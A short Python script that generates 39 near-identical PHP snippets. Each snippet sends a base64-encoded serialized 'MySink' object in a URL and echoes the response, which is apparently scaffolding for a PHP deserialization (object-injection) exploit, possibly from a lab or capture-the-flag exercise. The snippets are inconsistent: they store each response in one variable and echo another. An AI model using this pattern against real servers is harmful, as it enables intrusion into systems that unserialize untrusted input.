#!/usr/bin/env python3

for i in range(1, 40):
    statement = rf'''$url_payload{i} = $url . urlencode(base64_encode(serialize(new MySink($payload1))));
    /* echo $url_payload{i}."\r\n"; */
    $response_payload1 = file_get_contents("$url_payload{i}");
    echo $response_payload{i}."\r\n";
    usleep(2000);'''
    print(statement)
    print()
